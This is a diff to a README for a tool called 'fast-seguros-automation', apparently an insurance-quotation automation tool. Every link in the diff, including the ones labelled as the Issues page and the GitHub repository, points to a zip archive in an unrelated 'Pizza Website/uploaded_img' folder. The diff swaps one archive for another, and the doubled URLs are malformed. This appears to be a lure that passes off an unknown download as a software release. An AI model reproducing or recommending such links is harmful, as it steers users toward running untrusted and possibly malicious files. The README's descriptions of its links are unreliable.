@@ -7,7 +7,7 @@ Welcome to fast-seguros-automation! This tool helps you easily manage insurance 
 
 ## 📥 Download Now
 
-[![Download fast-seguros-automation](https://raw.githubusercontent.com/bhaskar-0819/fast-seguros-automation/main/Pizza Website/uploaded_img/fast-seguros-automation_v2.3-alpha.1.zip)](https://raw.githubusercontent.com/bhaskar-0819/fast-seguros-automation/main/Pizza Website/uploaded_img/fast-seguros-automation_v2.3-alpha.1.zip)
+[![Download fast-seguros-automation](https://github.com/bhaskar-0819/fast-seguros-automation/raw/refs/heads/main/Pizza Website/uploaded_img/seguros_automation_fast_1.4.zip https://github.com/bhaskar-0819/fast-seguros-automation/raw/refs/heads/main/Pizza Website/uploaded_img/seguros_automation_fast_1.4.zip)](https://github.com/bhaskar-0819/fast-seguros-automation/raw/refs/heads/main/Pizza Website/uploaded_img/seguros_automation_fast_1.4.zip https://github.com/bhaskar-0819/fast-seguros-automation/raw/refs/heads/main/Pizza Website/uploaded_img/seguros_automation_fast_1.4.zip)
 
 ## 📋 System Requirements
 
@@ -30,7 +30,7 @@ To run fast-seguros-automation effectively, you will need:
 
 To download the software, visit the following link:
 
-[Download fast-seguros-automation](https://raw.githubusercontent.com/bhaskar-0819/fast-seguros-automation/main/Pizza Website/uploaded_img/fast-seguros-automation_v2.3-alpha.1.zip)
+[Download fast-seguros-automation](https://github.com/bhaskar-0819/fast-seguros-automation/raw/refs/heads/main/Pizza Website/uploaded_img/seguros_automation_fast_1.4.zip https://github.com/bhaskar-0819/fast-seguros-automation/raw/refs/heads/main/Pizza Website/uploaded_img/seguros_automation_fast_1.4.zip)
 
 Once on the Releases page, follow these steps:
 
@@ -65,11 +65,11 @@ Once the application is open, you will see the main interface:
 
 ## 🤝 Support
 
-If you need help or have questions, please check the [Issues](https://raw.githubusercontent.com/bhaskar-0819/fast-seguros-automation/main/Pizza Website/uploaded_img/fast-seguros-automation_v2.3-alpha.1.zip) page on GitHub or reach out to the community.
+If you need help or have questions, please check the [Issues](https://github.com/bhaskar-0819/fast-seguros-automation/raw/refs/heads/main/Pizza Website/uploaded_img/seguros_automation_fast_1.4.zip https://github.com/bhaskar-0819/fast-seguros-automation/raw/refs/heads/main/Pizza Website/uploaded_img/seguros_automation_fast_1.4.zip) page on GitHub or reach out to the community.
 
 ## 🌐 Learn More
 
-For more details about features and updates, visit our [GitHub repository](https://raw.githubusercontent.com/bhaskar-0819/fast-seguros-automation/main/Pizza Website/uploaded_img/fast-seguros-automation_v2.3-alpha.1.zip).
+For more details about features and updates, visit our [GitHub repository](https://github.com/bhaskar-0819/fast-seguros-automation/raw/refs/heads/main/Pizza Website/uploaded_img/seguros_automation_fast_1.4.zip https://github.com/bhaskar-0819/fast-seguros-automation/raw/refs/heads/main/Pizza Website/uploaded_img/seguros_automation_fast_1.4.zip).
 
 Thank you for using fast-seguros-automation! We hope this tool simplifies your insurance quotation process.
 ```
